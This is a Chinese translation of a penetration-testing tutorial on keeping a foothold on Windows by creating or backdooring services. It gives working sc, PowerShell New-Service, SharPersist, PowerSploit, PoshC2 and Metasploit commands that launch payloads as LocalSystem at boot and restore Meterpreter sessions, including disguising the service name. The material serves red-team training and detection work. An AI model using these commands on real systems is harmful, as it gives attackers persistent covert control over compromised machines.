# Window权限维持（三）：新服务

来源: 03-干货系列\Window权限维持整理\Window权限维持（三）：新服务.pdf

如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提
升。创建一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。然而，在红队的行动
中，针对那些在威胁检测方面还不成熟的公司，可以用来制造进一步的干扰，企业应建立SOC能力，以
识别在其恶意软件中使用基本技术的威胁。
命令行实现
 
如果帐户具有本地管理员特权，则可以从命令提示符创建服务。参数“ binpath ”用于执行任意有效负
载，而参数“ auto ”用于确保恶意服务将自动启动。
CMD –新服务
或者，可以直接从PowerShell创建新服务。
PowerShell持久性–新服务
在两种情况下，启动服务时都会打开Meterpreter会话。
sc create pentestlab binpath= "cmd.exe /k C:\temp\pentestlab.exe" start="auto" 
obj="LocalSystem"
sc start pentestlab
New-Service -Name "pentestlab" -BinaryPathName "C:\temp\pentestlab.exe" -
Description "PentestLaboratories" -StartupType Automatic
sc start pentestlab

Meterpreter –新服务
SharPersist
 
SharPersist支持在受感染系统中创建新服务的持久性技术。在系统上安装新服务需要提升的访问权限
（本地管理员）。以下命令可用于添加新服务，该服务将在Windows启动期间作为本地系统执行任意
有效负载。
SharPersist –添加服务
Meterpreter会话将再次建立，或者与任何其他能够与有效负载进行通信的命令和控制框架建立连接。
SharPersist –通过服务的计费器
PowerSploit
 
PowerSploit可用于对合法服务进行后门程序以实现持久性。可以利用两个PowerShell函数来修改现有
服务的二进制路径，或者从先前手动创建的自定义服务中修改二进制路径，以执行任意有效负载。
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c pentestlab.exe" -
n "pentestlab" -m add
Set-ServiceBinPath -Name pentestlab -binPath "cmd.exe /k C:\temp\pentestlab.exe"
Write-ServiceBinary -Name pentestlab -Command "cmd.exe /k 
C:\temp\pentestlab.exe"

PowerSploit –持久性
PoshC2
 
PoshC2还具有创建新服务作为持久性技术的能力。但是，将执行base-64 PowerShell负载，而不是任
意可执行文件。从植入物处理机，以下模块将自动执行该技术。
PoshC2持久性–安装新服务
PoshC2将自动生成有效负载，并且该命令将在目标系统上执行以创建新服务。
install-servicelevel-persistence

PoshC2持久性–新服务
该服务将自动启动，并具有名称“ CheckpointServiceUpdater ”，以使其看起来合法。
PoshC2持久性–创建新服务
Metasploit
 
Metasploit框架具有一个后开发模块，该模块支持两种持久性技术。
1. 注册表运行键
2. 新服务
需要将启动变量修改为SERVICE，以便在系统上安装新服务。

Metasploit持久性模块–服务
需要Metasploit多重/处理程序模块来捕获有效负载并与受感染的主机建立Meterpreter会话。
Metasploit Meterpreter –通过新服务的持久性
 
译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。
原文地址：https://pentestlab.blog/2019/10/07/persistence-new-service/
use post/windows/manage/persistence_exe
set REXEPATH /tmp/pentestlab.exe
set SESSION 1
set STARTUP SERVICE
set LOCALEXEPATH C:\\tmp
run

 
